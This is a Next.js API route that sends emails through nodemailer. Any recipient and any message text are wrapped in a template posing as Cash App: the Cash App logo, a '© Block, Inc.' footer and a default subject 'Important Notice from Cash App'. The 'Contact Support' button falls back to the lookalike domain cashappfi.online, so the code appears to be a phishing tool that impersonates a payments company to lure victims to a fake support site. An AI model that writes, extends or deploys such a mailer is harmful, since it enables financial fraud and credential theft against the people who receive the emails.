import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

function createTransporter() {
  return nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: parseInt(process.env.SMTP_PORT || '587'),
    secure: process.env.SMTP_PORT === '465',
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });
}

export async function POST(request: NextRequest) {
  try {
    const { recipientEmail, recipientName, subject, emailBody } = await request.json();

    if (!recipientEmail || !emailBody) {
      return NextResponse.json({ error: 'recipientEmail and emailBody are required' }, { status: 400 });
    }

    if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) {
      return NextResponse.json({ error: 'SMTP not configured' }, { status: 500 });
    }

    const transporter = createTransporter();

    const fromAddress = process.env.SMTP_FROM?.includes('@')
      ? process.env.SMTP_FROM
      : `${process.env.SMTP_FROM || 'Cash App'} <${process.env.SMTP_USER}>`;

    // Convert plain text body to HTML paragraphs for the branded template
    const bodyAsHtml = emailBody
      .split('\n')
      .map((line: string) => line.trim())
      .filter((line: string) => line.length > 0)
      .map((line: string) => `<p style="margin: 0 0 14px 0; font-size: 15px; color: #333333; line-height: 1.6;">${line}</p>`)
      .join('');

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; background-color: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
  </style>
</head>
<body>
  <div style="width: 100%; background-color: #f5f5f5; padding: 20px 0;">
    <table style="width: 100%; max-width: 480px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; overflow: hidden;">
      <tr>
        <td style="padding: 40px 36px;">
          <!-- Logo -->
          <div style="text-align: center; margin-bottom: 32px;">
            <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/cash-Yvqz2Dw6PpXu9irpiFkZtdKEMFPJBc.png" alt="Cash App" style="width: 48px; height: 48px; border-radius: 8px;">
          </div>

          <!-- Body -->
          <div style="margin-bottom: 32px;">
            ${bodyAsHtml}
          </div>

          <!-- Support CTA -->
          <div style="text-align: center; margin-bottom: 28px;">
            <a href="${process.env.NEXT_PUBLIC_APP_URL || 'https://cashappfi.online'}?support=1" style="display: inline-block; background-color: #00D632; color: #ffffff; font-size: 14px; font-weight: 700; text-decoration: none; padding: 12px 28px; border-radius: 24px;">Contact Support</a>
            <p style="margin: 10px 0 0; font-size: 12px; color: #999999;">Need help? Chat with our support team in the app.</p>
          </div>

          <!-- Divider -->
          <div style="border-top: 1px solid #e8e8e8; padding-top: 20px; text-align: center;">
            <p style="margin: 0 0 8px 0; font-size: 12px; color: #999999; line-height: 1.5;">
              <a href="#" style="color: #0066cc; text-decoration: none;">Terms of Service</a>&nbsp;&nbsp;·&nbsp;&nbsp;<a href="#" style="color: #0066cc; text-decoration: none;">Privacy Policy</a>
            </p>
            <p style="margin: 0; font-size: 11px; color: #bbbbbb;">&copy; Block, Inc.</p>
          </div>
        </td>
      </tr>
    </table>
  </div>
</body>
</html>`;

    await transporter.sendMail({
      from: fromAddress,
      to: recipientEmail,
      subject: subject || 'Important Notice from Cash App',
      html,
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('[v0] send-email error:', error);
    return NextResponse.json({ error: `Failed to send email: ${error instanceof Error ? error.message : 'Unknown'}` }, { status: 500 });
  }
}
